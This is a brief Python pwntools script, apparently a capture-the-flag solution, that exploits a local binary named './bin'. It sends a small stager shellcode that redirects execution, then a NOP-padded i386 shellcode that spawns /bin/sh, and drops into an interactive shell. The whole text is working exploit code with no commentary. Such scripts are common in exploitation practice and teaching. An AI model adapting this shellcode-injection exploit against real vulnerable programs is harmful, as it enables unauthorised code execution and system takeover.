from pwn import *
context.log_level = 'debug'

cn = process("./bin")
shellcode1 = asm("pop ecx;mov cl,0xbe;push ecx;ret")
print len(shellcode1)
sh = asm(shellcraft.i386.sh())
shellcode2 = '\x90'*5+sh+'\x90'*(0x1000-len(sh)-6)

cn.sendline(shellcode1)
cn.sendline(shellcode2)
cn.interactive()
